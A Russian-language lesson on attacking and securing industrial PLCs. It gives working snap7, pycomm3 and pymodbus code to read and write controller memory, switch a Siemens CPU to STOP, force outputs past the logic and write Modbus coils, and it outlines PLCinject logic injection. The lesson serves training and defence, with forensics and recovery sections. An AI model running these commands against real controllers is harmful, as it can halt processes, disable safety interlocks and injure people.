**ПЛК** (программируемый логический контроллер) — сердце промышленного объекта. Он читает входы (датчики), исполняет логику и управляет выходами (приводы, клапаны, реле). Если предыдущие уроки были про то, как **говорить** с ПЛК, то этот — про то, как **понять и изменить то, что ПЛК делает**. Это самый опасный класс действий в OT: ошибка здесь приводит к аварии, а не к утечке данных.

## Как работает ПЛК: цикл сканирования

ПЛК исполняет программу циклически, называемым **scan cycle**:

1. **Чтение входов** (Input Image) — снимок состояния датчиков.
2. **Исполнение логики** — лестничная программа (ladder), FBD, SCL/ST.
3. **Обновление выходов** (Output Image) — запись на приводы.
4. **Обслуживание связи/диагностика** — ответы SCADA, обработка команд.

Длительность цикла — от 1 мс до сотен мс. Детерминизм критичен: если цикл нарушить (DoS), контроллер может уйти в ошибку или аварийный останов.

## Лестничная логика (Ladder)

Основной язык ПЛК — **лестничная диаграмма**: контакты (`-| |-` NO, `-|/|-` NC), катушки (`-( )-`), функциональные блоки. Пример:

```text
  Start   Stop     Motor
---| |----|/|------( )---
    I0.0   I0.1    Q0.0
```

Смысл: при нажатии Start (при отпущенном Stop) включается катушка Motor, которая самоблокируется. Классический пуск/стоп. Изменение одного контакта меняет поведение всей установки.

## Обнаружение и идентификация

```bash
# Siemens S7
nmap -p 102 --script s7-info 10.0.0.0/24
# Modbus
```

## Чтение и запись памяти Siemens (snap7)

```python
import snap7
from snap7.util import *
plc = snap7.client.Client()
plc.connect('10.0.0.20', 0, 1)          # rack=0, slot=1
print(plc.get_cpu_state())              # 'S7CpuStatusRun'
data = plc.read_area(snap7.types.Areas.DB, 1, 0, 2)  # DB1, offset 0, 2 байта
print(get_int(data, 0))
# Запись (ОСТОРОЖНО)
plc.write_area(snap7.types.Areas.DB, 1, 0, set_int(1234))
```

Пример вывода:

```text
S7CpuStatusRun
2345
```

`S7CpuStatusRun` означает, что программа исполняется. `get_cpu_state` также возвращает `S7CpuStatusStop`.

## Загрузка/выгрузка программы

Эксплуатация ПЛК — это не только теги. Можно **выгрузить** программу (если не защищена) для анализа логики и **загрузить** изменённую. Инструменты: TIA Portal, `snap7` (частично), `PLCinject`.

```bash
# Выгрузка блоков через snap7 (пример для стенда)
python3 - <<'PY'
import snap7
c = snap7.client.Client(); c.connect('10.0.0.20', 0, 1)
print(c.get_cpu_info().ModuleTypeName)
print(c.list_blocks())          # доступные блоки OB/DB/FB/FC
PY
```

Выгруженная программа вскрывает **процессную логику**: уставки, блокировки, аварийные пороги. Это разведка физического процесса.

## Режимы RUN / STOP

ПЛК имеет режимы: **RUN** (исполняет программу), **STOP** (остановлен), **PROGRAM** (редактирование). Переключение режима из сети — мощный, но разрушительный приём.

```python
import snap7
c = snap7.client.Client(); c.connect('10.0.0.20', 0, 1)
c.stop()     # перевести в STOP
c.start()    # вернуть в RUN
```

Перевод в STOP останавливает линию. Это DoS уровня процесса, а не сети.

## Защита ПЛК паролем

Современные ПЛК поддерживают защиту:

- **Siemens**: защита блоков (read/write protection), пароль на доступ по сети, «know-how protection».
- **Rockwell**: Security Authority, разрешения на теги, подпись проекта.
- **Общее**: отключение загрузки, ограничение по IP, режим только-чтение.

Проверка: попытка чтения/записи без пароля. Если проходит — защиты нет.

```python
# snap7: если установлена защита, get_cpu_state / read_area вернут ошибку
try:
    c.read_area(snap7.types.Areas.DB, 1, 0, 2)
    print("NO PROTECTION: read allowed")
except Exception as e:
    print("Protected:", e)
```

## PLCinject: инъекция логики

**PLCinject** (исследование Georgia Tech) умеет **внедрять** код в лестничную логику работающего Allen-Bradley через ENIP, маскируя его под легитимные rungs. Это демонстрация, что и логика контроллера может быть скомпрометирована без доступа к инженерной станции.

```text
PLCinject workflow:
1. Подключиться к ПЛК по ENIP (44818).
2. Найти свободные rungs или занять существующие.
3. Вставить вредоносную логику (например, сброс уставки при условии).
4. Логика исполняется в рамках обычного scan cycle.
```

## Unsafe-инструкции и последствия

Некоторые действия особенно опасны:

- **Force** (принудительное включение) входов/выходов — игнорирует реальные сигналы.
- **Запись в output image** напрямую — включает привод в обход логики.
- **Изменение таймеров/счётчиков** — ломает последовательности.
- **Сброс уставок аварий** — отключает защиты.
- **Маскирование алармов** — оператор не увидит проблему.

```python
# Force output (пример, крайне опасно)
from pycomm3 import LogixDriver
with LogixDriver('10.0.0.30') as plc:
    plc.write('Local:1:O.Data[0]', 1)   # включить выход в обход логики
```

## Разобранный пример: полный сценарий на стенде OpenPLC

```bash
# 1. Поднять OpenPLC и залить лестничную логику насоса
# 2. Обнаружить
nmap -p 502 --script modbus-discover 127.0.0.1
# 3. Прочитать состояние
python3 -c "
from pymodbus.client import ModbusTcpClient
c=ModbusTcpClient('127.0.0.1',port=502)
print(c.read_coils(0,8).bits)
"
# 4. Записать выход (в стенде — безопасно)
python3 -c "
from pymodbus.client import ModbusTcpClient
c=ModbusTcpClient('127.0.0.1',port=502)
c.write_coil(0, True)
"
```

Пример вывода чтения:

```text
[False, False, False, False, True, False, False, False]
```

Пятая катушка (индекс 4) активна — насос работает. После записи индекса 0 он запускается по команде.

## Edge cases и подводные камни

- **Rack/slot**: у Siemens неправильные rack/slot = нет подключения.
- **DB-адресация**: offset в байтах, не в словах; ошибка на 1 байт даёт мусор.
- **Endianness**: S7 — big-endian, многие инструменты ждут little.
- **Защита know-how**: блок можно читать, но не выгружать код.
- **Run/Stop и watchdog**: перевод в STOP без последующего START = остановка.
- **Force остаётся**: забытый Force-бит может жить до перезагрузки.
- **Мультимастер**: инженерная станция и ваш скрипт конфликтуют за соединение.

## Функциональная безопасность (Safety) и почему она критична

Современные ПЛК делят логику на **стандартную** и **safety** (функциональная безопасность, SIL по IEC 61508/61511). Safety-логика реализует аварийные остановы, блокировки, защиту людей и оборудования. Она исполняется отдельно (иногда на отдельном CPU — например, Siemens F-CPU) и имеет собственные проверки.

Для пентестера это означает:

- Запись в standard-логику не отключает safety — «защита держит».
- Но safety-параметры (уставки) могут быть доступны через сеть, если не защищены паролем.
- Компрометация инженерной станции с правами на safety — крайне опасна.
- Никогда не трогайте safety-логику «для проверки»: она существует, чтобы предотвращать аварии.

| Тип логики | Назначение | Риск вмешательства |
|-----------|-----------|-------------------|
| Standard | управление процессом | высокий |
| Safety (SIL) | защита, аварийный останов | критический |
| Диагностика | мониторинг | средний |

## Диагностика и мониторинг ПЛК

ПЛК отдают диагностику через тот же протокол. Полезно снимать:

```bash
# Siemens: диагностический буфер через snap7
python3 - <<'PY'
import snap7
c = snap7.client.Client(); c.connect('10.0.0.20', 0, 1)
print(c.get_cpu_info())          # модель, версия, серийник
print(c.get_cpu_state())         # RUN/STOP
print(c.list_blocks())           # OB/DB/FB/FC
PY
```

Пример вывода:

```text
ModuleTypeName: CPU 315-2 DP
SerialNumber:   S C-XXXXXXXX
ASName:         PLC_LINE1
S7CpuStatusRun
['OB1', 'OB100', 'DB1', 'FB1', 'FC1']
```

Список блоков показывает структуру проекта: `OB1` — главный цикл, `OB100` — старт, `FB`/`FC` — функции. По названиям часто угадывается назначение (например, `FB_Pump_Control`).

## Подбор n-day по версии прошивки

Идентификация даёт модель и версию — это вход для поиска известных уязвимостей:

```bash
# Модель и версия из s7-info
nmap -p 102 --script s7-info 10.0.0.20
# Далее — сверка с базой CVE по модели/версии (в лаборатории)
```

Старые прошивки Siemens/Rockwell имеют публичные CVE (DoS, обход аутентификации, path traversal в веб-интерфейсе). Обновление прошивки в OT — сложная процедура (окно обслуживания), поэтому парк часто устаревший.

## Сравнение проектов (project diff)

Выгрузив программу до и после инцидента, можно найти изменения — это ключевая техника OT-форензики:

```bash
# Псевдошаги
# 1. Выгрузить проект (если защита позволяет)
# 2. Нормализовать (убрать таймстемпы)
# 3. Сравнить
diff -u baseline_ladder.txt current_ladder.txt
```

Изменённые rungs могут указывать на инъекцию логики (как в PLCinject) или на легитимную правку. Это самый надёжный способ обнаружить скрытое вмешательство в управляющую логику.

## Восстановление и последствия

После вмешательства в ПЛК важно:

- **Вернуть исходную программу** из проверенной резервной копии.
- **Проверить safety-логику** на целостность.
- **Сбросить Force-биты** — они могут жить до перезагрузки.
- **Сменить пароли** доступа к ПЛК и инженерным станциям.
- **Зафиксировать baseline** заново после восстановления.

Вмешательство в управление физическим процессом может привести к травмам и авариям; все действия фиксируются и согласуются с эксплуатацией.
